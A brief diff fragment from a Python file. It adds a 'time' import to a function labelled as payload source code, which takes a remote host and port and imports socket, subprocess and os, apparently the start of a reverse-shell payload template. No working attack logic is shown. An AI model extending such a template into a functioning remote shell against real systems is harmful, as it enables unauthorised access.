@@ -85,6 +85,7 @@ def launch(args: dict) -> None:
 #source code (only for payloads)
 def code(rhost: str, rport: int):
     return """
+import time
 import socket
 import subprocess
 import os
